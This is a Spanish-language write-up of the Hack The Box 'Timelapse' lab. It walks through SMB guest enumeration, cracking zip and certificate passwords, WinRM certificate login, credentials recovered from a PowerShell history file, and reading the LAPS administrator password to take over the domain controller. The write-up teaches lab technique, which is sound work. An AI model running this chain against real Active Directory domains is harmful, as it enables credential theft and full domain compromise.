---
tags:
title: Timelapse - Easy (HTB)
permalink: /Timelapse-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49693 10.10.11.152 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 00:32 EDT
Nmap scan report for 10.10.11.152
Host is up (0.51s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-10-04 12:32:34Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2025-10-04T12:34:12+00:00; +8h00m00s from scanner time.
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49693/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-04T12:33:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.08 seconds
```

# Service enumeration

### Port 53 / DNS

Con un escaneo hacia el puerto `53` dns, con `dig` podemos ver que el dominio tiene un `DC (Domain Controller)`

```bash
dig any @10.10.11.152 timelapse.htb

; <<>> DiG 9.20.11-4+b1-Debian <<>> any @10.10.11.152 timelapse.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 30266
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;timelapse.htb.                 IN      ANY

;; ANSWER SECTION:
timelapse.htb.          600     IN      A       10.10.11.152
timelapse.htb.          3600    IN      NS      dc01.timelapse.htb.
timelapse.htb.          3600    IN      SOA     dc01.timelapse.htb. hostmaster.timelapse.htb. 142 900 600 86400 3600
timelapse.htb.          600     IN      AAAA    dead:beef::24e
timelapse.htb.          600     IN      AAAA    dead:beef::b5c6:f9aa:a6a6:3e26

;; ADDITIONAL SECTION:
dc01.timelapse.htb.     3600    IN      A       10.10.11.152
dc01.timelapse.htb.     3600    IN      AAAA    dead:beef::5d64:2db1:629c:d67d
dc01.timelapse.htb.     3600    IN      AAAA    dead:beef::24c

;; Query time: 411 msec
;; SERVER: 10.10.11.152#53(10.10.11.152) (TCP)
;; WHEN: Sat Oct 04 00:33:26 EDT 2025
;; MSG SIZE  rcvd: 252
```

Asi que lo agregamos al `/etc/hosts`.

```bash
sudo echo -e '10.10.11.152\t\ DC01\t\ dc01.timelapse.htb\t\ timelapse.htb' | sudo tee -a /etc/hosts
```

### Port 139/445 SMB 

Vemos que no tenemos posibilidad de loguearnos con un NULL SESSION por `smbmap`. 

```BASH
smbmap -H 10.10.11.152 -u ''

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[!] Access denied on 10.10.11.152, no fun for you...                                                                         
[*] Closed 1 connections
```

Pero si probamos con el usuario de invitado `guest` si nos deja enumerar y ademas es un usuario que esta habilitado.

```bash
crackmapexec smb 10.10.11.152 -u 'guest' -p '' --shares
SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\guest: 
SMB         10.10.11.152    445    DC01             [+] Enumerated shares
SMB         10.10.11.152    445    DC01             Share           Permissions     Remark
SMB         10.10.11.152    445    DC01             -----           -----------     ------
SMB         10.10.11.152    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.152    445    DC01             C$                              Default share
SMB         10.10.11.152    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.152    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.11.152    445    DC01             Shares          READ            
SMB         10.10.11.152    445    DC01             SYSVOL                          Logon server share
```

Vemos que como dicho usuario tiene capacidad de lectura en el recurso compartido `Shares`. Vamos a enumerarlo para ver que encontramos, para eso nos conectamos haciendo uso de la herramienta de `impacket` `smbclient`.

```bash
impacket-smbclient timelapse.htb/guest@10.10.11.152 -dc-ip 10.10.11.152 -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
Shares
SYSVOL
```

Vemos que hay dos carpetas:
```bash
# use shares
# ls
drw-rw-rw-          0  Mon Oct 25 11:55:14 2021 .
drw-rw-rw-          0  Mon Oct 25 11:55:14 2021 ..
drw-rw-rw-          0  Mon Oct 25 15:40:06 2021 Dev
drw-rw-rw-          0  Mon Oct 25 11:55:14 2021 HelpDesk
```

Contenido de `dev`.
```bash
# cd Dev
# ls
drw-rw-rw-          0  Mon Oct 25 15:40:06 2021 .
drw-rw-rw-          0  Mon Oct 25 15:40:06 2021 ..
-rw-rw-rw-       2611  Mon Oct 25 17:05:30 2021 winrm_backup.zip
# get winrm_backup.zip
```

Contenido de `HelpDesk.`
```bash
 cd ../helpdesk
 ls
drw-rw-rw-          0  Mon Oct 25 11:55:14 2021 .
drw-rw-rw-          0  Mon Oct 25 11:55:14 2021 ..
-rw-rw-rw-    1118208  Mon Oct 25 11:55:14 2021 LAPS.x64.msi
-rw-rw-rw-     104422  Mon Oct 25 11:55:14 2021 LAPS_Datasheet.docx
-rw-rw-rw-     641378  Mon Oct 25 11:55:14 2021 LAPS_OperationsGuide.docx
-rw-rw-rw-      72683  Mon Oct 25 11:55:14 2021 LAPS_TechnicalSpecification.docx
```

Nos descargamos todo lo conseguido a nuestra maquina y lo examinamos 

```bash
mget *
```

Revisando los metadatos y el contenido de los documentos conseguidos en la carpeta `HelpDesk` no vemos nada interesante, asi que pasemos a revisar el contenido del `.zip` hallado en `Dev`.

```bash
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/timelapse]
└─# 7z l winrm_backup.zip      

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 2611 bytes (3 KiB)

Listing archive: winrm_backup.zip

--
Path = winrm_backup.zip
Type = zip
Physical Size = 2611

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-25 10:21:20 .....         2555         2405  legacyy_dev_auth.pfx
------------------- ----- ------------ ------------  ------------------------
2021-10-25 10:21:20               2555         2405  1 files
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/timelapse]
└─# 7z x winrm_backup.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 2611 bytes (3 KiB)

Extracting archive: winrm_backup.zip
--
Path = winrm_backup.zip
Type = zip
Physical Size = 2611

    
Enter password (will not be echoed):
ERROR: Wrong password : legacyy_dev_auth.pfx


Sub items Errors: 1


Break signaled
```

Vemos que para descomprimirlo nos pide una contraseña de la cual hasta el momento no disponemos, pero podemos generar un hash del archivo con la herramienta `zip2john`para despues poder romper el hash y obtener asi la password que nos deje descomprimir el archivo.

```bash
zip2john winrm_backup.zip > hash.txt
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/timelapse]
└─# cat hash.txt                                           
winrm_backup.zip/legacyy_dev_auth.pfx:$pkzip$1*1*2*0*965*9fb*12ec5683*0*4e*8*965*72aa*1a84b40ec6b5c20abd7d695aa16d8c88a3cec7243acf179b842f2d96414d306fd67f0bb6abd97366b7aaea736a0cda557a1d82727976b2243d1d9a4032d625b7e40325220b35bae73a3d11f4e82a408cb00986825f936ce33ac06419899194de4b54c9258cd7a4a7f03ab181b611a63bc9c26305fa1cbe6855e8f9e80c058a723c396d400b707c558460db8ed6247c7a727d24cd0c7e93fbcbe8a476f4c0e57db890a78a5f61d1ec1c9a7b28b98a81ba94a7b3a600498745859445ddaef51a982ae22577a385700fdf73c99993695b8ffce0ef90633e3d18bf17b357df58ea7f3d79f22a790606b69aed500db976ae87081c68d60aca373ad25ddc69bc27ddd3986f4d9ce77c4e49777c67a0740d2b4bbca38b4c2b06452f76 <SNIP>*$/pkzip$:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip
                                                                                                                                                                                             
```

Y con `john` lo rompemos.
```bash
john hash.txt -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2025-10-04 00:45) 2.500g/s 8683Kp/s 8683Kc/s 8683KC/s swimfan12..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Vemos que nos descubre la contraseña `supremelegacy`, asi que ahora si podemos descomprimir, pero tambien nos vamos a encontrar con el mismo problema al querer ver el contenido del certificado.

```bash
openssl pkcs12 -info -in legacyy_dev_auth.pfx
Enter Import Password:
MAC: sha1, Iteration 2000
MAC length: 20, salt length: 20
Mac verify error: invalid password?
```

Hacemos lo mismo que hicimos con el `.zip` pero con el certificado.
```bash
pfx2john legacyy_dev_auth.pfx > pfx.txt
```

```bash                                                                                                                         cat pfx.txt             
legacyy_dev_auth.pfx:$pfxng$1$20$2000$20$eb755568327396de179c4a5d668ba8fe550ae18a$3082099c3082060f06092a864886f70d010701a0820600048205fc308205f8308205f4060b2a864886f70d010c0a0102a08204fe308204fa301c060a2a864886f70d010c0103300e04084408e3852b96a898020207d004<SNIP>:::::legacyy_dev_auth.pfx
```

Y volvemos a usar `john` para romper el hash.

```bash
john pfx.txt -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:16 DONE (2025-10-04 00:47) 0.06123g/s 197902p/s 197902c/s 197902C/s thyriana..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Tenemos otra contraseña: `thuglegacy`, y sabemos con la info del certificado que pertenece al usuario `legacyy`. Ahora podemos aprovechar el certificado para crear uno publico y un `.pem` para poder conectarnos con `evil-winrm` proporcionando la key y el certificado.

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```

Para desencriptar la `key` usamos la contraseña desencriptada.

```bash
openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
Enter pass phrase for legacyy_dev_auth.key-enc:
writing RSA key
```

Y ahora dumpeamos el certificado.

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
Enter Import Password:
```

Y ahora nos logueamos con `evil-winrm`.

```bash
evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```

# Privilege escalation

Enumerando el sistema vemos que en la ruta `C:\users\legacyy\Appdata\roaming\microsoft\windows\powershell\PSReadLine` hay un history con credenciales del usuario `svc_deploy`

```bash
*Evil-WinRM* PS C:\users\legacyy\Appdata\roaming\microsoft\windows\powershell\PSReadLine> ls


    Directory: C:\users\legacyy\Appdata\roaming\microsoft\windows\powershell\PSReadLine


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt


*Evil-WinRM* PS C:\users\legacyy\Appdata\roaming\microsoft\windows\powershell\PSReadLine> type ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

Por lo que ahora podemos enumerar el dominio con `bloodhound`.

```bash
bloodhound-python -c all -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -ns 
```

![Untitled 43 1](images/Untitled 43 1.jpg)

Vemos que el usuario `svc_deploy` es parte del grupo `LAPS_READERS` y que a su vez este grupo tiene permisos y privilegios `LAPSPasswords` sobre el `DC01`.

>LAPS guarda en Active Directory la contraseña **local** del administrador de máquina (atributo `ms-Mcs-AdmPwd`) para equipos unidos al dominio, y la rota automáticamente. Quien tenga **permiso de lectura** sobre ese atributo puede recuperar la contraseña actual.

![Untitled 44 1](images/Untitled 44 1.jpg)

Para eso podemos hacer uso de `bloodyAD` para poder ver la contraseña guardada del admin del `dc01`. 

{% raw %}
```bash
bloodyAD --host 10.10.11.152 -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

distinguishedName: CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
ms-Mcs-AdmPwd: ){%%7x2H;3{%z#6mqs4BtFrL
ms-Mcs-AdmPwdExpirationTime: 134044866155170475
```
{% endraw %}

Con eso podemos verificar si esa pass pertenece al usuario `Administrator`, para eso voy a usar `crackmapexec`.

{% raw %}
```bash
crackmapexec smb 10.10.11.152 -u administrator -p '){%%7x2H;3{%z#6mqs4BtFrL'
SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\administrator:){%%7x2H;3{%z#6mqs4BtFrL (Pwn3d!)
```
{% endraw %}

Ahora que tenemos la contraseña de `Administrator` podemos conectarnos como el en el dominio.

{% raw %}
```bash
evil-winrm -i 10.10.11.152 -u administrator -p '){%%7x2H;3{%z#6mqs4BtFrL'
```
{% endraw %}

Y la flag de `root` vamos a ver que esta en el directorio del user `TRX` que tambien es parte del grupo `Domain Admins`.

```bash
C:\Users\trx> ls desktop


    Directory: C:\Users\trx\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/4/2025   5:30 AM             34 root.txt


*Evil-WinRM* PS C:\Users\trx> type desktop/root.txt
a889aa506eb4ccb6c730c8ceb8c12c52
```

`~Happy Hacking.`


